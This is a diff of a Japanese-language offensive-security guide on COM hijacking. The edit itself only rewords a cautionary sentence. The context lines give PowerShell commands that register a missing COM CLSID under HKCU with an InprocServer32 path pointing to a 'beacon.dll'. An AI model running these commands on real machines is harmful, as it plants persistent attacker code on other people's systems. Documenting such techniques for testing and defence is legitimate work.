@@ -23,7 +23,7 @@ HKCUの値はユーザーによって変更できるため、**COM Hijacking**�
 * _Result_が**NAME NOT FOUND**であること。
 * _Path_が**InprocServer32**で終わること。
 
-どの存在しないCOMを偽装するか決定したら、次のコマンドを実行します。_数秒ごとに読み込まれるCOMを偽装することを決定した場合は、過剰になる可能性があるため注意してください。_
+どの存在しないCOMを偽装するか決定したら、次のコマンドを実行します。_数秒ごとに読み込まれるCOMを偽装することに決めた場合は、過剰になる可能性があるため注意してください。_
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
